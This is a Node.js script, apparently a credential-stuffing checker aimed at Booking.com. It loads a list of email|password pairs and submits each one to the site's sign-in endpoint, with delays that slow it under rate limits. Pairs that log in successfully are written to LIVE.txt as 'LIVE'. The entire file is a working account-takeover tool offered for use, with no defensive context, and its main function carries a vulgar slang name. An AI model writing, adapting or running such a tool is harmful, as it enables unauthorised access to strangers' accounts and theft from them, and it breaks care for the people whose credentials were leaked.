//coded by 4LM05TH3V!L
//recode matamu
const fs = require ('fs');
const fetch = require('node-fetch');
const delay = require('delay');
const readline = require('readline-sync');
const figlet = require('figlet');
const exec = require('shell_exec').shell_exec;
var banner = exec('php banner.php');
console.log(banner);
function String(start, end, all) {
	const rgx = new RegExp(`${start}(.*?)${end}`);
	const str = all
	const res = rgx.exec(str);
	return res;
}
const kontol = (email, password) => new Promise ((resolve, reject) => {
    const URL = "https://account.booking.com/account/sign-in/password";
    const data = {"login_name":`${email}`,"password":`${password}`,"client_id":"vO1Kblk7xX9tUn2cpZLS","state":"","scope":"","code_challenge":"","code_challenge_method":"","op_token":""};
    fetch(URL, {
        method: 'POST',
        headers: {
            'Host': 'account.booking.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(result => {
        resolve(result.text())
    })
    .then(err => {
        reject(err)
    })
});

(async () => {
    const list = readline.question("Input Empas : ");
    const getString = fs.readFileSync(list).toString().split("\n");
    for(momos in getString) {
        await delay(500);
        const arr = getString[momos].replace("\r"," ").split("|");
        const email = arr[0];
        const password = arr[1];
        const check = await kontol(email, password)
        const live = new RegExp('"next_step":"redirect"', 'i')
        const die = new RegExp('"message":"Too many requests"', 'i')
        if(live.exec(check)){
            console.log(`[${momos}] ${email}|${password} => LIVE!`);
            fs.appendFileSync("LIVE.txt", `${email}|${password} => LIVE!\n`)
        }else if(die.exec(check)){
            console.log(`[${momos}] ${email}|${password} => Too many requests`);
        }else{
            console.log(`[${momos}] ${email}|${password} => DIE!`);
        }
        await delay(1000);
    }
    console.log('Saved To LIVE.txt')
})()
